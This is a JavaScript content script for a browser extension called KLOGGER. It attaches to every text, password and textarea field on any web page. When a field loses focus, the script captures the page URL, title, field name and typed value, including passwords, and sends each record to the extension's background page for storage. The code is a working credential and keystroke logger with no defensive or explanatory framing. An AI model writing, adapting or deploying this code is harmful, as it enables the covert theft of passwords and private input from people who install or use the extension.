(function($){
  KLOGGER={}
  KLOGGER.lastlog= {};


  /**
  var typelogger = angular.module('typelogger',[]);
  typelogger.controller('PopupController',function($scope){
      console.log("PopupController Initualised");
      $scope.$watch(KLOGGER.lastlog,function(){
          $scope.lastlog = KLOGGER.lastlog;
          console.log("Log Object changed!");
      })
  });
     **/
  //initialises stuff, crawls every webpage in search for input controls to latch unto
  KLOGGER.init=function(){
    var isSupported = "localStorage" in window,
        error = {},
        store = null,
        log = {}

    KLOGGER.toggleSwitch = $('#toggleSwitch');

    if(isSupported){
      KLOGGER.logPort = chrome.runtime.connect({name:"klogger"})
      var allInputs = $("[type=text],[type=password],textarea");
      allInputs.each(function()
      {
        var el=$(this)
        var originalFn =el.blur;

        el.blur(function(){
          log.link = window.location.href;
          log.pageTitle = $('title').text();
          log.inputName = this.name;
          log.data= this.value;
          log.date = new Date().getTime();
          if(log.data !== ""){
            KLOGGER.addLog(log);
          }
          el.blur = originalFn;
          //el.trigger('blur');
        })
      });

      KLOGGER.toggleSwitch.onclick=function(){
          console.log("I have been toggled!!!!!!!!!!!!!!!!!!!!!!!!!!");
      }
    }
    else{
      error.message = "Local Storage not supported"
    }
  }

  //save just one log
  KLOGGER.addLog=function(log){
    var message = {
      type:"addLog",
      data:log
    }
    chrome.runtime.sendMessage(message,function(msg){
        console.log("Log Sent to event page!");
    });
  }

  //get all logs
  KLOGGER.getLogs=function(){
    var message = {
      type:"getAll",
      data:null
    }
    chrome.runtime.sendMessage(message,function(msg){
      console.log(msg);
    });
  };

    KLOGGER.displayLog=function(msg)
    {
        console.log($("p.log-title").text());
        $(".log-title").text(msg.pageTitle);
        $(".captured").text(msg.data);
        $(".time").text(msg.date);
    }

    KLOGGER.toggleCapture=function()
    {
        KLOGGER.toggleSwitch
        console.log("fucking with Capture toggle button!!!!");
    }
  KLOGGER.init();
})(jQuery,undefined)